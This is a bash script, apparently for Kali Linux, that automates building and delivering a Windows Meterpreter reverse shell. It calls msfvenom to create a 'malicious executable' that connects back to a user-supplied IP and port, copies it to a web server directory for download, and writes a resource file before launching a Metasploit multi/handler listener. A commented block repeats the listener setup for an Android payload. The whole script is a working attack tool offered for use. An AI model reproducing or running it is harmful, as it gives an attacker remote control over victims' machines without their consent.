#!/bin/bash

clear

figlet -t -f Speed Windows Reverse Shell | lolcat -S 2 -a -s 50


echo -n "Enter the desired  port [ENTER]: "
read port
echo " "
echo -n "Enter the desired ip address [ENTER]: "
read ip
echo " "
echo -n "Enter your malicious executable's name [ENTER]: "
read name
echo " "
echo "Generating payload... "
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -b "\x00" -e x86/shikata_ga_nai -f exe -o $name.exe
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -b "\x00" -f exe -o /home/kali/bash/$name.exe

check=($(ls /home/kali/bash | grep $name.exe))

echo "-----------------------------------------------------------------------------------------------------------------------------------------------------"
echo "Payload Generated "
echo "Here is your Exe :" $check
echo "-----------------------------------------------------------------------------------------------------------------------------------------------------"

read -r -p "Do you want to send the payload to /var/www/html/  now ? [y/n] " response
if [[ "$response" =~ ^([yY][eE][sS]|[yY])+$ ]]
then
     echo "Copying payload to /var/www/html "
        cp $name.exe /var/www/html/
        echo "Copied "
        echo "Your Url :"" ""http://"$ip"/"$name".exe"
        echo "use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST" ""$ip"
set LPORT" ""$port"
set ExitOnSession false
exploit -j -z" | tee listenerw.rc


echo "Now Starting Msf multi/handler for the above !"
msfconsole -r listenerw.rc
           # touch ~/meterpreter.rc
           # echo use exploit/multi/handler > ~/meterpreter.rc
           # echo set PAYLOAD android/meterpreter/reverse_tcp >> ~/meterpreter.rc
           # echo set LHOST $ip >> ~/meterpreter.rc
           # echo set LPORT $port >> ~/meterpreter.rc
           # echo set ExitOnSession false >> ~/meterpreter.rc
           # echo exploit -j -z >> ~/meterpreter.rc


else
    echo "Done"
fi
sleep 2
echo "Thank You ! "